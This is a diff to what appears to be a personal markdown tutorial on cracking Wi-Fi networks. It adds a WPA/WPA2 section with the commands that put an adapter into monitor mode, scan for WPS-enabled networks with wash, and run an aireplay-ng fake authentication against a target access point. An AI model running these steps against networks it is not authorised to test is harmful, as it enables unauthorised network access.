@@ -15,6 +15,8 @@ Network Hacking and gaining access to Wifi networks and cracking them.
 - VMware Fusion.
 - airodump-ng
 - aircrack-ng
+- WASH
+- aireplay-ng
 
 ## Steps for WAP
 
@@ -45,5 +47,21 @@ aircrack-ng test.cap
 - Copy the key and remove the : and that would be the wifi password.
 
 ## Steps for WPA/WPA2
+
+- Changing the wireless USB mode to monitoring
+```bash
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+```
+- Find wifi networks with WPS enebled using the tool WASH
+```bash
+wash --interface wlan0
+```
+- Use aireplay-ng to create a fake authentication with te first MAC address is the target and the second is the USB wireless adapter MAC address, which is the first 12 characters from the ifconfig, make sure to replace the "-" with the ":".
+```bash
+aireplay-ng --fakeauth 30 78:67:0E:31:4C:42 -h 3A:97:5F:E2:18:5F wlan0
+```
+
 
 ￼
